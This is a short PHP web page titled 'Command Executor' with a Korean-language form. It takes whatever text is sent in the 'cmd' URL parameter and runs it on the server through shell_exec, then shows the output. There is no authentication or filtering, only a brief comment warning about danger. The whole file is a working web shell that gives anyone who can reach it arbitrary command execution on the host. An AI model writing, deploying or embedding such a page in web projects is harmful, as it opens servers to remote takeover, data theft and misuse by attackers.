<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f7f7f7;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
        }
        input[type="text"] {
            width: 80%;
            padding: 8px;
            margin-right: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 8px 16px;
            border: none;
            background-color: #0078d7;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
        }
        pre {
            background-color: #333;
            color: #eee;
            padding: 10px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Command Executor</h1>
        <form method="get" action="">
            <input type="text" name="cmd" placeholder="명령어 입력" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
            <input type="submit" value="실행">
        </form>
        <hr>
        <?php
        if (isset($_GET['cmd']) && trim($_GET['cmd']) !== '') {
            // WARNING: Using shell_exec can be dangerous in production environments
            $cmd = $_GET['cmd'];
            $output = shell_exec($cmd);
            echo "<h2>실행 결과:</h2>";
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        }
        ?>
    </div>
</body>
</html>